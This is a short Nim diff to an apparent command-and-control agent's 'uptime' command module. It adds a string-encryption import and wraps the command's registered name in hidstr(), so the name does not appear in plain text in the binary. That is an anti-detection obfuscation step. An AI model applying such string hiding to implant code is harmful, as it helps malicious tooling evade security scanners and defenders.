@@ -1,6 +1,7 @@
 import std/[json, osproc]
 import core/types
 import commands/registry
+import crypto/strenc
 
 proc uptimeExecute(taskId: string, params: JsonNode, state: AgentState,
                    send: SendMsg): TaskResult =
@@ -19,4 +20,4 @@ proc uptimeExecute(taskId: string, params: JsonNode, state: AgentState,
     return TaskResult(output: "Error: " & e.msg, status: "error", completed: true)
 
 proc initUptime*() =
-  register("uptime", uptimeExecute)
+  register(hidstr("uptime"), uptimeExecute)
